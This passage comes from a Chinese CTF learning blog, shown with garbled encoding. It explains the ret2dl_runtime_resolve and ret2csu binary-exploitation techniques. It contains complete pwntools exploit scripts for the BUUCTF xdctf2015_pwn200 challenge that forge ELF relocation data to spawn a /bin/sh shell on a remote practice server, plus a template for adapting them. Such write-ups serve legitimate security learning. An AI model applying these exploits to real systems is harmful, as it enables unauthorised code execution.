class="comment">#ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¼ªé€ çš„link_mapï¼Œç¬¬äºŒä¸ªåˆ™æ˜¯è¢«åŠ«æŒè°ƒç”¨</span></span><br><span class="line"><span class="comment">#å‡½æ•°çš„å‚æ•°ï¼ˆsystemï¼‰ï¼Œä¹Ÿå°±æ˜¯/bin/shçš„ä½ç½®</span></span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#å…ˆå­˜å…¥/bin/shå­—ç¬¦ä¸²ï¼Œä½¿å…¶ä½äºbss_baseçš„ä½ç½®</span></span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)<span class="comment">#å¡«å……åƒåœ¾æ•°æ®</span></span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment">#ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼ªé€ çš„link_mapé¦–åœ°å€ï¼ˆå°±æ˜¯systemå‡½æ•°åæ”¾çš„ä½ç½®ï¼‰ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦ä¼ªé€ çš„å‡½æ•°å</span></span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)<span class="comment">#å¡«å……åƒåœ¾æ•°æ®</span></span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="BUUCTFä¸Šçš„xdctf2015-pwn200"><a href="#BUUCTFä¸Šçš„xdctf2015-pwn200" class="headerlink" title="BUUCTFä¸Šçš„xdctf2015_pwn200"></a>BUUCTFä¸Šçš„xdctf2015_pwn200</h2><p><img src="/../img/2706180-20220228175843037-1667392941.png"></p><p><img src="/../img/2706180-20220228175854393-1488686373.png"></p><p>åœ¨ä»¥è¿™é“é¢˜ä¸ºä¾‹çœ‹ä¸€ä¸‹Roputilçš„å¨åŠ›ï¼ˆä¸è¿‡è¿™é“é¢˜å®åœ¨æœ‰ç‚¹æ€é¸¡ç”¨ç‰›åˆ€äº†ï¼Œå› ä¸ºå­˜åœ¨æ³„éœ²å‡½æ•°ï¼Œç›´æ¥ç”¨ret2libcä¹Ÿå¯ä»¥ï¼‰</p><p>æˆ‘åªæ˜¯æ‹¿ä¸Šé¢çš„expæ”¹äº†ä¸€ä¸‹åç§»å’Œè¿œç¨‹é¢˜ç›®çš„åœ°å€ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºåˆšå¼€å§‹ç›´æ¥ä»Roputilsé‡Œé¢å¼•å…¥äº†æ‰€æœ‰çš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬è¦ç”¨åŸæœ¬pwntoolsä¸­çš„å‡½æ•°æ—¶ï¼Œéœ€è¦å†å¼•ç”¨ä¸€ä¸‹ï¼‰<strong>è¿™é‡Œè¿˜æŠŠä¸Šé¢é‚£ä¸ªexpä¸­çš„from pwn import processæ¢æˆäº†from pwn import remote</strong>ï¼Œæœ€åç›´æ¥ä¸€æŠŠæ¢­ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">&#x27;bof&#x27;</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25383</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./&#x27; + processName)</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ret_addr=<span class="number">0x0804851B</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line">buf1 = rop.fill(offset)</span><br><span class="line">buf1 += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf1 += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf1)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_base))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220228180305633-1728995910.png"><br>ç„¶åä¸‹é¢æˆ‘å†ç»™å‡ºæ‰‹åŠ¨æ„é€ çš„expï¼Œå…¶å®æˆ‘è¿˜æ˜¯ç›´æ¥å¤åˆ¶äº†ä¸Šé¢çš„expï¼Œåªä¸è¿‡æ”¹äº†å‡ ä¸ªå‚æ•°è€Œå·²ï¼Œè¿™å…¶å®å°±æ˜¯ä¸ªæ¨¡æ¿è€Œå·²ï¼Œæˆ‘æŠŠéœ€è¦æ”¹çš„å‚æ•°ç”¨ä¸‰ä¸ª*æ ‡æ³¨ä¸€ä¸‹,å‰©ä¸‹çš„ç›´æ¥ç…§æ¬ï¼Œä¸€æŠŠæ¢­ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28789</span>)<span class="comment">#***</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./bof&#x27;)#***</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./bof&#x27;</span>)<span class="comment">#***</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#å…ˆåˆå§‹åŒ–ä¸€ä¸‹ä¸€ä¼šè¦ç”¨åˆ°çš„æ®µé¦–åœ°å€</span></span><br><span class="line">offset=<span class="number">112</span><span class="comment">#***</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x08048628</span><span class="comment">#***</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804851A</span><span class="comment">#***</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span><span class="comment">#***</span></span><br><span class="line"><span class="comment">#è¿™ä¸ªbase_addræ˜¯æˆ‘ä»¬è¦æŠŠæ ˆè¿ç§»çš„åœ°æ–¹ï¼Œç”¨gdbå‘ç°è¿™ä¸€éƒ¨åˆ†æ˜¯å¯å†™çš„ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©è¿ç§»åˆ°è¿™é‡Œ</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span><span class="comment">#è¿™ä¸ªfake_sym_addræ˜¯Elf32_Symç»“æ„çš„é¦–åœ°å€</span></span><br><span class="line"><span class="comment">#åŸæœ¬æ˜¯è¦æŠŠä¼ªé€ çš„ELf32_Symç»“æ„å†™åœ¨åç§»32çš„ä½ç½®çš„ï¼Œä½†æ˜¯è¿˜è¦å¯¹é½ï¼Œå› æ­¤ä¸‹é¢è¿˜è¦å†åŠ align</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)<span class="comment">#Elf32_Symç»“æ„æ˜¯16å­—èŠ‚ï¼Œå› æ­¤åœ°å€ä¹Ÿéœ€è¦å’Œ16å­—èŠ‚å¯¹é½ï¼ŒäºŒè€…åœ°å€ç›¸å‡</span></span><br><span class="line"><span class="comment">#ç„¶ååªå–æœ€åä¸€ä½ï¼Œå°±å¯ä»¥ç†è§£æˆäºŒè€…çš„åœ°å€æ˜¯æ”¾åœ¨äº†ä¸€ä¸ªç»“æ„é‡Œé¢ï¼ˆä½†å…¶å®ä¸æ˜¯è¿™æ ·çš„ï¼Œä¸è¿‡å¯ä»¥ç†è§£æˆè¿™æ ·ï¼Œç”»ä¸ªå›¾å°±æ‡‚äº†ï¼‰</span></span><br><span class="line"><span class="comment">#ç„¶åæœ€åçš„å€¼è¢«0x10æ‰€å‡ï¼Œæ±‚çš„å°±æ˜¯fake_sym_addrè·ç¦»16ä¸ªå­—èŠ‚æ‰€è¡¥é½å·®çš„å­—èŠ‚æ•°</span></span><br><span class="line"><span class="comment">#è‡³äºä¸ºä»€ä¹ˆå‡çš„æ˜¯dynsymï¼Œæ·¦ï¼Œå› ä¸ºdynsymä¸€å®šæ˜¯è¢«å¯¹é½äº†çš„ï¼Œå› æ­¤å®ƒéœ€è¦æ‰¾ä¸€ä¸ªå¯¹é½çš„è¡¨æ¥åšå‚è€ƒå•Š</span></span><br><span class="line">fake_sym_addr+=align<span class="comment">#æœ€åå†åŠ ä¸Šè¿™ä¸ªä¸ºäº†è¡¥é½çš„å­—èŠ‚æ‰æ˜¯æœ€åæˆ‘ä»¬è¦æ„é€ çš„fake_symçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#è¿™ä¸ªst_nameå°±æ˜¯dynstræ®µé¦–åœ°å€è·ç¦»ç›®æ ‡å‡½æ•°åç§°çš„åç§»</span></span><br><span class="line"><span class="comment">#æˆ‘ä»¬æŠŠæœ€ç»ˆçš„systemå‡½æ•°åç§°å¸ƒç½®åˆ°äº†fake_sym_addr+0x10çš„ä½ç½®ï¼Œä¸ºå•¥åŠ 0x10?å› ä¸ºElf32_Symçš„ç»“æ„å¤§å°ä¸º16å­—èŠ‚</span></span><br><span class="line">st_info=<span class="number">0x12</span><span class="comment">#è¿™ä¸ªå…¶å®æ˜¯ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯å‰24å­—èŠ‚çš„st_bindå’Œåå…«å­—èŠ‚çš„st_typeï¼ˆä¸è¿‡æˆ‘æ„Ÿè§‰æ²¡å¿…è¦åŒºåˆ†ï¼Œç›´æ¥åŠ èµ·æ¥å°±è¡Œï¼‰</span></span><br><span class="line"><span class="comment">#å¦å¤–å°±æ˜¯è¿™ä¸ª0x12æ˜¯å¯ä»¥åœ¨IDAé‡Œé¢é€šè¿‡dynsymæ¥æŸ¥åˆ°</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)</span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#è¿™ä¸ªæ˜¯ret.pltç»“æ„ä¸­çš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œä¹Ÿå°±æ˜¯è§£æä¹‹åçš„çœŸå®åœ°å€å†™å…¥çš„åœ°æ–¹</span></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span><span class="comment">#è¿™ä¸ªæˆ‘ä¸æ˜¯å¤ªç¡®å®šï¼Œæˆ‘æ„Ÿè§‰é™¤0x10æ˜¯å› ä¸ºElf32_Symçš„å¤§å°æ˜¯16å­—èŠ‚</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªåç§»åº”è¯¥æ˜¯ä»¥ä¸€ä¸ªç»“æ„ï¼ˆ16å­—èŠ‚ï¼‰ä¸ºå•ä½çš„</span></span><br><span class="line">r_type=<span class="number">0x7</span><span class="comment">#è¿™ä¸ª0x7æ˜¯é‡å®šä½çš„ä¸€ç§ç±»å‹ï¼ŒæŒ‡çš„æ˜¯å¯¼å…¥å‡½æ•°ï¼Œè¿›å…¥_dl_fixupå‡½æ•°é‡Œé¢ï¼Œè¿˜ä¼šæ£€æŸ¥è¿™æ˜¯ä¸æ˜¯0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type&amp;<span class="number">0xf</span>)<span class="comment">#è¿™é‡Œ&lt;&lt;8æ˜¯å› ä¸ºï¼Œæœ€åè¿˜è¦å†&gt;&gt;8ï¼Œä»è€Œä¿æŒæ­£å¸¸ï¼Œè€Œ&amp;0xfï¼Œå…¶å®æ²¡ç”¨ï¼Œä¸å†™ä¹Ÿè¡Œ</span></span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span><span class="comment">#ä»rel.pltåˆ°base_addr+28çš„åç§»ä¹Ÿå°±</span></span><br><span class="line"><span class="comment"># æ˜¯æ‰§è¡Œ_dl_runtime_resolveçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œè€ŒåŠ 28çš„åŸå› æ˜¯ï¼Œæˆ‘ä»¬å°†rel.pltç»“æ„å¸ƒç½®åœ¨äº†è·ç¦»base_addråç§»24çš„ä½ç½®</span></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#è¿™é‡Œå°±æ˜¯ä¼ªé€ çš„rel.pltç»“æ„</span></span><br><span class="line">payload1=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) <span class="comment">#åŠ«æŒæ‰§è¡Œæµï¼Œè®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡readï¼Œå°†æˆ‘ä»¬æƒ³è¦ä¼ªé€ çš„å†…å®¹å­˜å…¥æˆ‘ä»¬æŒ‡å®šçš„åœ°æ–¹</span></span><br><span class="line">payload1+=p32(four_pop_ret) <span class="comment">#è¿™é‡Œéœ€è¦ç”¨è¿ç»­ä¸‰ä¸ªpopæŠŠreadçš„å‚æ•°ç»™ä»æ ˆé¡¶æ¸…ç©ºï¼Œä¸ç„¶retçš„æ—¶å€™å°±ä¼šå‡ºç°é—®é¢˜</span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span>)</span><br><span class="line">payload1+=p32(leave_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2=p32(plt0)</span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#è¿™ä¸ªæ”¾ç½®çš„æ˜¯systemçš„å‚æ•°çš„ä½ç½®</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#ç”±äºreadçš„å‚æ•°æ˜¯ä¸‰ä¸ªï¼Œè€Œsystemçš„å‚æ•°åªç”¨äº†ç¬¬ä¸€ä¸ªï¼Œå› æ­¤å¦å¤–ä¸¤ä¸ªå‚æ•°éœ€è¦å¡«å……ä¸€ä¸‹åƒåœ¾æ•°æ®</span></span><br><span class="line">payload2+=fake_rel_plt</span><br><span class="line">payload2+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload2+=fake_sym</span><br><span class="line">payload2+=<span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span><span class="comment">#å› ä¸ºä¸Šé¢æåˆ°äº†ä¼šæŠŠå‚æ•°æ”¾åœ¨åç§»80çš„ä½ç½®ï¼Œå› æ­¤è¿™é‡Œå¡«å……\x00åˆ°åç§»80è¿™é‡Œ</span></span><br><span class="line">payload2+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">100</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2dlå›é¡¾æé€Ÿç‰ˆ"><a href="#ret2dlå›é¡¾æé€Ÿç‰ˆ" class="headerlink" title="ret2dlå›é¡¾æé€Ÿç‰ˆ"></a>ret2dlå›é¡¾æé€Ÿç‰ˆ</h1><p>mdï¼Œä¹‹å‰å†™è¿‡çš„æ–‡ç« é‡æ–°å›æ¥å†çœ‹ï¼Œæ„Ÿè§‰å¤ªå•°å—¦äº†ï¼Œé‡æ–°æ¸©ä¹ äº†ä¸€ä¸‹ï¼Œè¿™é‡Œå†™ä¸€ä¸ªå…³äºå»¶è¿Ÿç»‘å®šçš„è¿‡ç¨‹æé€Ÿç‰ˆã€‚</p><blockquote><p>dynamicæ®µ ä¿å­˜äº†åŠ¨æ€é“¾æ¥å™¨æ‰€éœ€è¦åŸºæœ¬ä¿¡æ¯ï¼Œä¸‹é¢ä¸‰ä¸ªéƒ½ä½äºdynamicæ®µ</p><p>dynstr(dynamic string table)      åŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨</p><p>dynsym(dynamic symbol)    åŠ¨æ€ç¬¦å·è¡¨</p><p>rel.plt</p></blockquote><p>å»¶è¿Ÿç»‘å®šçš„è¿‡ç¨‹æ ¸å¿ƒæ˜¯_dl_lookup_symbol_xå‡½æ•°æ‹¿ç€æœç´¢çš„å‡½æ•°åå»libcä¸­åŒ¹é…å¯¹åº”å‡½æ•°ï¼Œå¤§è‡´è¿‡ç¨‹æ˜¯ç”¨dynstråœ°å€+å‡½æ•°ååœ¨dynstré‡Œçš„åç§»æ¥æŸ¥æ‰¾åˆ°çš„å‡½æ•°åå­—ç¬¦ä¸²ã€‚</p><p>dynstré‡Œçš„åç§»éœ€è¦é€šè¿‡rel.pltåŠ ä¸Šdl_runtime_resolveå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å…ˆå¾—åˆ°dynsymé‡Œçš„åç§»ï¼Œå†é€šè¿‡dynsymé‡Œçš„åç§»åŠ ä¸Šdynsymçš„åœ°å€å¾—åˆ°ã€‚æ‹¿ç€è¿™ä¸ªåç§»åŠ ä¸Šdynstrçš„åœ°å€å³å¯ã€‚</p><p>ç”¨idaç®€å•æ¼”ç¤ºä¸€ä¸‹è¿‡ç¨‹</p><p>å…ˆå»rel.plté‡Œæ‰¾åˆ°å¯¹åº”çš„ç»“æ„ï¼Œè¿™ä¸ªåç§»æ˜¯dl_runtime_resolveå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281937155.png" alt="image-20221128193705005"></p><p>ç„¶åç”¨ä¸Šé¢çš„é‚£ä¸ª0x207å³ç§»8å¾—åˆ°2ï¼Œè¿™ä¸ªå°±æ˜¯è¯¥å‡½æ•°åœ¨dynsymé‡Œçš„åç§»å¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281945695.png" alt="image-20221128194516577"></p><p>ç„¶åçœ‹ä¸€ä¸‹è¿™ä¸ªåœ°å€0x080472a0çš„å€¼ï¼Œå¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281946850.png" alt="image-20221128194631780"></p><p>æœ€åæ‹¿ç€è¿™ä¸ª0x3dåŠ ä¸Šdynstrçš„é¦–åœ°å€å³å¯æ‰¾åˆ°å‡½æ•°åå­—ï¼Œå¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281947796.png" alt="image-20221128194726664"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281947187.png" alt="image-20221128194759131"></p><h1 id="å…¶ä»–åšå®¢é“¾æ¥"><a href="#å…¶ä»–åšå®¢é“¾æ¥" class="headerlink" title="å…¶ä»–åšå®¢é“¾æ¥"></a>å…¶ä»–åšå®¢é“¾æ¥</h1><p>æœ€åç”±äºå‚è€ƒäº†å¾ˆå¤šå¸ˆå‚…çš„åšå®¢ï¼Œè¿™é‡Œé¢æˆ‘æŠŠä¸€äº›æˆ‘æ„Ÿè§‰å†™çš„ä¸é”™çš„åšå®¢æ”¾ä¸€ä¸‹ï¼Œå¦‚æœå¯¹äºæˆ‘ä¸Šé¢å†™çš„æœ‰ä¸æ‡‚çš„ä¹Ÿå¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™äº›åšå®¢</p><p>ä¸‹é¢è¿™ä¸¤ä¸ªåšå®¢éƒ½æŠŠexpåˆ†å¼€æ„é€ çš„è¿‡ç¨‹è¯¦ç»†å†™äº†ã€‚</p><p><a href="http://www.soolco.com/post/114840_1_1.html">æ·±å…¥ç†è§£-dl_runtime_resolve-åšå®¢ (soolco.com)</a></p><p><a href="https://xz.aliyun.com/t/5122#toc-4">é«˜çº§ROP ret2dl_runtime ä¹‹é€šæ€è¯¦è§£ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>ç„¶åæˆ‘æ¢ç©¶ä¸Šè¿°_dl_runtime_solveæ‰§è¡Œæµç¨‹ä¸»è¦æ˜¯è·Ÿç€ä¸‹é¢è¿™ä¸ªå¸ˆå‚…çš„åšå®¢åšçš„</p><p><a href="https://www.jianshu.com/p/57f6474fe4c6">_dl_runtime_resolve - ç®€ä¹¦ (jianshu.com)</a></p><p>ä¸‹é¢è¿™ä¸ªæ˜¯ä»‹ç»_dl_runtime_solveçš„å‰ç½®çŸ¥è¯†å¾ˆè¯¦ç»†</p><p><a href="https://zhuanlan.zhihu.com/p/134105591">æ·±å…¥çª¥æ¢åŠ¨æ€é“¾æ¥ - çŸ¥ä¹ (zhihu.com)</a></p><p>ä¸‹é¢è¿™ä¸ªåšå®¢æ˜¯å¯¹ä¸€äº›æºç åšäº†æ³¨é‡Š</p><p><a href="https://blog.csdn.net/jazrynwong/article/details/89851640">(25æ¡æ¶ˆæ¯) glibcåŠ¨æ€é“¾æ¥å™¨dl_runtime_resolveç®€è¦åˆ†æ_Hello World.c-CSDNåšå®¢</a></p><p>ä¸‹é¢ä¸¤ä¸ªä¸»è¦æ˜¯è§£é‡Šäº†ä¸‹ç”¨åˆ°çš„ä¸€äº›æ®µçš„è§£é‡Š</p><p><a href="https://www.jianshu.com/p/8dd91ec35dda">https://www.jianshu.com/p/8dd91ec35dda</a></p><p><a href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a></p><p>ç„¶åè¿™ä¸ªå¸ˆå‚…çš„expå†™çš„æ¯”è¾ƒæ¸…æ™°ï¼Œè§£å†³äº†æˆ‘çš„ä¸€äº›é—®é¢˜</p><p><a href="https://eqqie.cn/index.php/archives/1023">https://eqqie.cn/index.php/archives/1023</a></p><p>ç„¶åä¸‹é¢è¿™ä¸ªå¸ˆå‚…å†™çš„åº”è¯¥æ˜¯æœ€è¯¦ç»†çš„äº†ï¼Œå¯¹ä¸€äº›å°ç»†èŠ‚æœ‰ç–‘é—®çš„å¯ä»¥åœ¨è¿™ä¸Šé¢æ‰¾æ‰¾</p><p><a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3&#x2F;#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºret2csuçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/4202235.html"/>
      <url>/posts/4202235.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>å…³äºè¿™ä¸ªret2csuï¼Œä¸å…¶è¯´å®ƒæ˜¯ä¸€ç§é¢˜å‹ï¼Œå€’ä¸å¦‚è¯´è¿™æ˜¯ä¸€ç§æ–¹æ³•ï¼ˆç”¨äºæ§åˆ¶å¯„å­˜å™¨ï¼‰</p></blockquote><h2 id="ä»€ä¹ˆæ˜¯ret2csuï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ret2csuï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ret2csuï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ret2csuï¼Ÿ</h2><p>è¿™ä¸ªå…¶å®å°±æ˜¯åœ¨ç¨‹åºä¸­ä¸€èˆ¬éƒ½ä¼šæœ‰ä¸€æ®µä¸‡èƒ½çš„æ§åˆ¶å‚æ•°çš„gadgetsï¼Œé‡Œé¢å¯ä»¥æ§åˆ¶rbx,rbp,r12,r13,r14,r15ä»¥åŠrdx,rsi,ediçš„å€¼ï¼Œå¹¶ä¸”è¿˜å¯ä»¥callæˆ‘ä»¬æŒ‡å®šçš„åœ°å€ã€‚ç„¶ååŠ«æŒç¨‹åºæ‰§è¡Œæµçš„æ—¶å€™ï¼ŒåŠ«æŒåˆ°è¿™ä¸ª__libc_csu_initå‡½æ•°å»æ‰§è¡Œï¼ˆè¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥åˆå§‹åŒ–libcçš„ï¼Œå› æ­¤åªè¦æ˜¯åŠ¨æ€é“¾æ¥çš„ç¨‹åºå°±éƒ½ä¼šæœ‰è¿™ä¸ªå‡½æ•°ï¼ˆè‡³å°‘æˆ‘è¿˜æ²¡æœ‰é‡è§è¿‡ç‰¹æ®Šæƒ…å†µï¼‰ï¼‰ï¼Œ<strong>ä»è€Œè¾¾åˆ°æ§åˆ¶å‚æ•°çš„ç›®çš„</strong>ã€‚</p><h2 id="ä¸‹é¢æ˜¯-libc-csu-initçš„æ±‡ç¼–ä»£ç ã€‚"><a href="#ä¸‹é¢æ˜¯-libc-csu-initçš„æ±‡ç¼–ä»£ç ã€‚" class="headerlink" title="ä¸‹é¢æ˜¯__libc_csu_initçš„æ±‡ç¼–ä»£ç ã€‚"></a>ä¸‹é¢æ˜¯__libc_csu_initçš„æ±‡ç¼–ä»£ç ã€‚</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:0000000000400540                 public __libc_csu_init</span><br><span class="line">.text:0000000000400540 __libc_csu_init proc near               ; DATA XREF: _start+16â†‘o</span><br><span class="line">.text:0000000000400540 ; __unwind &#123;</span><br><span class="line">.text:0000000000400540                 push    r15</span><br><span class="line">.text:0000000000400542                 push    r14</span><br><span class="line">.text:0000000000400544                 mov     r15d, edi</span><br><span class="line">.text:0000000000400547                 push    r13</span><br><span class="line">.text:0000000000400549                 push    r12</span><br><span class="line">.text:000000000040054B                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400552                 push    rbp</span><br><span class="line">.text:0000000000400553                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:000000000040055A                 push    rbx</span><br><span class="line">.text:000000000040055B                 mov     r14, rsi</span><br><span class="line">.text:000000000040055E                 mov     r13, rdx</span><br><span class="line">.text:0000000000400561                 sub     rbp, r12</span><br><span class="line">.text:0000000000400564                 sub     rsp, 8</span><br><span class="line">.text:0000000000400568                 sar     rbp, 3</span><br><span class="line">.text:000000000040056C                 call    _init_proc</span><br><span class="line">.text:0000000000400571                 test    rbp, rbp</span><br><span class="line">.text:0000000000400574                 jz      short loc_400596</span><br><span class="line">.text:0000000000400576                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400578                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400580</span><br><span class="line">.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54â†“j</span><br><span class="line">.text:0000000000400580                 mov     rdx, r13</span><br><span class="line">.text:0000000000400583                 mov     rsi, r14</span><br><span class="line">.text:0000000000400586                 mov     edi, r15d</span><br><span class="line">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040058D                 add     rbx, 1</span><br><span class="line">.text:0000000000400591                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594                 jnz     short loc_400580</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596 loc_400596:                             ; CODE XREF: __libc_csu_init+34â†‘j</span><br><span class="line">.text:0000000000400596                 add     rsp, 